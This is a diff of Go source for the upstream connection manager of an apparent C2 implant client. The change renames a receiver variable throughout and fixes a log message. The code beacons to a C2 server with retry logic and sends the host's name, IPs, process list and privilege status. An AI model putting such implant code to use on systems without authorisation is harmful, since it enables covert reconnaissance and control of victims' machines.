@@ -43,7 +43,7 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 }
 
 // Connect will try until the C2 can be reached via a upstream.
-func (d *UpstreamManager) Connect() {
+func (u *UpstreamManager) Connect() {
 	// Thread which retrieves packets from the active upstream and sends it to client
 	var packet model.Packet
 	var connected bool
@@ -51,33 +51,33 @@ func (d *UpstreamManager) Connect() {
 		for {
 			// We dont care which upstream we are connected to
 			select {
-			case packet, connected = <-d.UpstreamWs.ChanIncoming():
+			case packet, connected = <-u.UpstreamWs.ChanIncoming():
 				if !connected {
-					d.ReconnectWebsocket() // Blocks until we can reach server again
+					u.ReconnectWebsocket() // Blocks until we can reach server again
 					continue               // We are connected again, do as before
 				}
-			case packet, connected = <-d.UpstreamRest.ChanIncoming():
+			case packet, connected = <-u.UpstreamRest.ChanIncoming():
 				// No reconnect handling atm
 			}
 
 			// Send the packet to client
-			d.ChannelIncoming <- packet
+			u.ChannelIncoming <- packet
 		}
 	}()
 
 	// Thread which sends outgoing packets
 	go func() {
 		for {
-			packet, ok := <-d.ChannelOutgoing
+			packet, ok := <-u.ChannelOutgoing
 			if !ok {
 				break
 			}
 
-			if d.UpstreamWs.Connected() {
-				d.UpstreamWs.ChanOutgoing() <- packet
+			if u.UpstreamWs.Connected() {
+				u.UpstreamWs.ChanOutgoing() <- packet
 				//break
-			} else if d.UpstreamRest.Connected() {
-				d.UpstreamRest.ChanOutgoing() <- packet
+			} else if u.UpstreamRest.Connected() {
+				u.UpstreamRest.ChanOutgoing() <- packet
 				//break
 			} else {
 				log.Errorf("UpstreamManager: No active upstreams, drop packet and sleep")
@@ -86,70 +86,70 @@ func (d *UpstreamManager) Connect() {
 		}
 	}()
 
-	d.ConnectRetryForever()
+	u.ConnectRetryForever()
 }
 
 // ConnectRetryForever will try to connect to the server, forever. Then starts upstreams
-func (d *UpstreamManager) ConnectRetryForever() error {
-	d.reconnectTimer.tick()
+func (u *UpstreamManager) ConnectRetryForever() error {
+	u.reconnectTimer.tick()
 	for {
-		if d.campaign.ClientUseWebsocket {
+		if u.campaign.ClientUseWebsocket {
 			// Try: Websocket
-			err := d.UpstreamWs.Connect()
+			err := u.UpstreamWs.Connect()
 			if err != nil {
 				log.Debugf("UpstreamManager: Trying to connect to upstraem websocket resulted in: %s", err.Error())
 			} else {
 				log.Infof("UpstreamManager: Connected to websocket")
-				d.UpstreamWs.Start()
-				d.sendClientinfo()
+				u.UpstreamWs.Start()
+				u.sendClientinfo()
 				break
 			}
 		} else {
-			err := d.UpstreamRest.Connect()
+			err := u.UpstreamRest.Connect()
 			if err != nil {
 				log.Debugf("UpstreamManager: Trying to connect to upstream REST resulted in: %s", err.Error())
 			} else {
 				log.Infof("UpstreamManager: Connected to REST")
-				d.UpstreamRest.Start()
-				d.sendClientinfo()
+				u.UpstreamRest.Start()
+				u.sendClientinfo()
 				break
 			}
 		}
 
 		log.Debug("UpstreamManager: Could not connect, sleeping...")
-		time.Sleep(d.reconnectTimer.getSleepDuration())
+		time.Sleep(u.reconnectTimer.getSleepDuration())
 	}
 
 	return nil
 }
 
 // Reconnect will destroy the currect WS upstream, and block until connected again
-func (d *UpstreamManager) ReconnectWebsocket() {
+func (u *UpstreamManager) ReconnectWebsocket() {
 	// Throw away old UpstreamWs, and try to connect again
-	upstreamWs := MakeUpstreamWs(d.config, d.campaign)
-	d.UpstreamWs = &upstreamWs
-	log.Infof("UpstreamManager: Upstream websocket disconnectd. Retrying...")
-	d.ConnectRetryForever()
+	upstreamWs := MakeUpstreamWs(u.config, u.campaign)
+	u.UpstreamWs = &upstreamWs
+	log.Infof("UpstreamManager: Upstream websocket disconnect. Retrying...")
+	u.ConnectRetryForever()
 }
 
 // sendClientinfo will send client information (like process list) to the server
-func (d *UpstreamManager) sendClientinfo() {
-	if !d.campaign.DoClientInfo {
+func (u *UpstreamManager) sendClientinfo() {
+	if !u.campaign.DoClientInfo {
 		return
 	}
 
 	arguments := make(model.PacketArgument)
 	response := make(model.PacketResponse)
-	response["hostname"] = d.config.Hostname
-	model.AddArrayToResponse("localIp", d.config.LocalIps, response)
-	response["arch"] = d.config.Arch
-	model.AddArrayToResponse("processes", d.config.Processes, response)
+	response["hostname"] = u.config.Hostname
+	model.AddArrayToResponse("localIp", u.config.LocalIps, response)
+	response["arch"] = u.config.Arch
+	model.AddArrayToResponse("processes", u.config.Processes, response)
 	isElevated, isAdmin, err := arch.GetPermissions()
 	if err == nil {
 		response["isElevated"] = strconv.FormatBool(isElevated)
 		response["isAdmin"] = strconv.FormatBool(isAdmin)
 	}
 
-	packet := d.config.MakeClientPacket("clientinfo", arguments, response)
-	d.ChannelOutgoing <- *packet
+	packet := u.config.MakeClientPacket("clientinfo", arguments, response)
+	u.ChannelOutgoing <- *packet
 }
